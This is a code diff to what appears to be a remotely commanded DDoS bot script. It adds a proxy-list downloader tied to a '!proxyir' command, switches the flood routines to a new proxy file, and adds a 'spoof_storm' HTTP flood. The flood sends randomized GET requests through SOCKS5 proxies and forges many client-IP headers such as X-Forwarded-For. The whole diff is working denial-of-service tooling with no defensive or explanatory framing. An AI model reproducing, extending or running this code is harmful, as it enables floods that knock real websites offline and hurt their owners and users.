@@ -292,6 +292,14 @@ def socks5geter():
     for pyy in rq:
         pf.write(pyy + '\n')
     pf.close()
+    
+def iroxy():
+    prapixd = "https://fineproxy.org/wp-admin/admin-ajax.php?action=proxylister_download&nonce=bde80b50f4&format=txt&filter=%7B%7D"
+    pf = open('ir.txt', 'w+')
+    rq = (get(prapixd).text).split()
+    for pyy in rq:
+        pf.write(pyy + '\n')
+    pf.close()
 
 def main():
     while True:
@@ -334,6 +342,8 @@ def main():
                             timer = time() + timme
                         elif c2.split()[0] == '!proxy':
                             thr(target=socks5geter).start()
+                        elif c2.split()[0] == '!proxyir':
+                            thr(target=iroxy).start()
                     except:
                         pass
                 try:
@@ -663,7 +673,7 @@ def main():
                         while time() < timer:
                             try:
                                 if url.split('://')[0] == 'https':
-                                    sok5 = open('socks5.txt' , 'r').read().split()
+                                    sok5 = open('theprxy.txt' , 'r').read().split()
                                     s = socksocket()
                                     s = socket.create_connection(target , port)
                                     pri = che(sok5).split(':');
@@ -675,6 +685,7 @@ def main():
                                     s = ctx.wrap_socket(s , server_hostname=target)
                                     s.connect((target , port))
                                 else:
+                                    sok5 = open('theprxy.txt' , 'r').read().split()
                                     s = socksocket()
                                     pri = che(sok5).split(':');
                                     s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
@@ -706,7 +717,7 @@ def main():
                         while time() < timer:
                             try:
                                 if url.split('://')[0] == 'https':
-                                    sok5 = open('socks5.txt' , 'r').read().split()
+                                    sok5 = open('theprxy.txt' , 'r').read().split()
                                     s = socksocket()
                                     pri = che(sok5).split(':');
                                     s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
@@ -714,6 +725,31 @@ def main():
                                     s = ctx.wrap_socket(s , server_hostname=target)
                                     s.connect((target , port))
                                 else:
+                                    s = socksocket()
+                                    pri = che(sok5).split(':');
+                                    s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
+                                    s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
+                                    s.connect((target , port))
+                                for _ in range(rpc):
+                                    ipt = spo_ip()
+                                    payl = f'GET {path}?{strm(6)}={strm(6)}={strm(6)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {ua}\r\nAccept: {che(app)}\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nSec-Fetch-Dest: document\r\nDNT: 1\r\nSec-Fetch-Mode: navigate\r\nSec-Fetch-Site: cross-site\r\nSec-Fetch-User: ?1\r\nSec-Gpc: 1\r\nPragma: no-cache\r\nUpgrade-Insecure-Requests: 1\r\nX-Originating-IP: {ipt}\r\nX-Forwarded-For: {ipt}\r\nX-Forwarded: {ipt}\r\nForwarded-For: {ipt}\r\nX-Forwarded-Host: {ipt}\r\nX-Remote-IP: {ipt}\r\nX-Remote-Addr: {ipt}\r\nX-ProxyUser-Ip: {ipt}\r\nX-Original-URL: {ipt}\r\nClient-IP: {ipt}\r\nX-Client-IP: {ipt}\r\nTrue-Client-IP: {ipt}\r\nX-Host: {ipt}\r\nCluster-Client-IP: {ipt}\r\nX-ProxyUser-Ip: {ipt}\r\nVia: 1.0 fred, 1.1 {ipt}\r\n\r\n'.encode()
+                                    s.send(payl)
+                            except:
+                                pass
+                            
+                    def spoof_storm():
+                        while time() < timer:
+                            try:
+                                if url.split('://')[0] == 'https':
+                                    sok5 = open('ir.txt' , 'r').read().split()
+                                    s = socksocket()
+                                    pri = che(sok5).split(':');
+                                    s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
+                                    s.setsockopt(IPPROTO_TCP , TCP_NODELAY , 1)
+                                    s = ctx.wrap_socket(s , server_hostname=target)
+                                    s.connect((target , port))
+                                else:
+                                    sok5 = open('ir.txt' , 'r').read().split()
                                     s = socksocket()
                                     pri = che(sok5).split(':');
                                     s.set_proxy(SOCKS5 , str(pri[0]) , int(pri[1]))
@@ -1187,5 +1223,6 @@ def main():
                     s.close()
                 except:
                     pass
+            print("Retrying connection in 5 seconds...")
             sleep(5)
 main()
